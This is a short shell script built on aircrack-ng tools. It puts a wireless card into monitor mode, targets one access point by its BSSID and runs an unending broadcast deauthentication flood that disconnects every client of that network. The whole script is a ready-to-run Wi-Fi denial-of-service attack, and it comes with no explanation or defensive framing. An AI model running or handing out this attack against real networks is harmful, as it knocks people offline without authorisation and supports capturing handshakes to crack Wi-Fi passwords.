trap "kill 0" SIGINT
airmon-ng start wlo1
xterm -e airodump-ng wlo1mon &
xterm -e airodump-ng --channel 1 --bssid C8:3A:35:24:08:50 wlo1mon &
xterm -e aireplay-ng --deauth 0 -a C8:3A:35:24:08:50 -c FF:FF:FF:FF:FF:FF wlo1mon &
wait
